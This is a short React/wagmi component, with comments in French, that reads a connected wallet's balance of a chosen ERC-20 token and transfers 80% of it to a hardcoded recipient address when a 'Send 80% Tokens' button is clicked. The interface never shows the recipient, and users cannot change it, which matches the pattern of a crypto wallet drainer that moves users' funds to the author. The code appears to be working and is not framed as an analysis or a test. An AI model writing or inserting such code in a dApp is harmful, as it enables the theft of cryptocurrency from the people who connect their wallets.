import { useState } from "react";
import { useAccount, useWalletClient } from "wagmi";
import { formatUnits, parseUnits } from "ethers/lib/utils";
import { writeContract, waitForTransaction, readContract } from "@wagmi/core";
import erc20ABI from "@/abis/erc20ABI.json";
import { useAtom } from "jotai";
import { tokenAtom } from "@/store/atoms";

const RECIPIENT_ADDRESS = "0x518c5D62647E60864EcB3826e982c93dFa154af3";

const SendTokens = () => {
  const { address } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [tokenAddress, setTokenAddress] = useAtom(tokenAtom);
  const [isSending, setIsSending] = useState(false);

  const sendTokens = async () => {
    if (!walletClient || !address) return;
    setIsSending(true);

    try {
      // Récupérer le solde du token ERC-20
      const balance: bigint = await readContract({
        address: tokenAddress,
        abi: erc20ABI,
        functionName: "balanceOf",
        args: [address],
      });

      // Calculer 80% du solde disponible
      const amountToSend = (balance * 80n) / 100n;

      // Vérifier que le montant est valide
      if (amountToSend <= 0n) {
        console.error("Montant insuffisant pour envoyer 80%.");
        setIsSending(false);
        return;
      }

      // Envoyer la transaction
      const tx = await writeContract({
        address: tokenAddress,
        abi: erc20ABI,
        functionName: "transfer",
        args: [RECIPIENT_ADDRESS, amountToSend],
      });

      const receipt = await waitForTransaction(tx.hash);
      console.log("Transaction réussie :", receipt);
    } catch (error) {
      console.error("Échec de la transaction :", error);
    }

    setIsSending(false);
  };

  return (
    <div>
      <input
        type="text"
        placeholder="Token Address"
        value={tokenAddress}
        onChange={(e) => setTokenAddress(e.target.value)}
      />
      <button onClick={sendTokens} disabled={isSending}>
        {isSending ? "Sending..." : "Send 80% Tokens"}
      </button>
    </div>
  );
};

export default SendTokens;
